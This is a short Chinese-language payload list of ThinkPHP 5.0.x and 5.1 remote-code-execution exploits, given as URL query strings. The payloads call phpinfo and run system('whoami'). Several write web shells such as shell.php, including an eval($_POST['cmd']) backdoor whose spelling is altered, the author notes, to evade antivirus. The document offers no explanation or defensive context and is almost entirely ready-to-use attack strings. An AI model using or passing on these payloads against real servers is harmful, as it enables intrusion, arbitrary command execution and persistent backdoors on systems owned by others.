 
5.0.x 版本：
```
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=内容用URL编码
```
 
5.1版本：
```
?s=index/think\request/input?data[]=phpinfo()&filter=assert
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>
?s=index/\think\template\driver\file/write
&cacheFile=aaa.php&content=<?php @eVVVVval($_POST['cmd']);?>        (就是eval，电脑杀毒)
```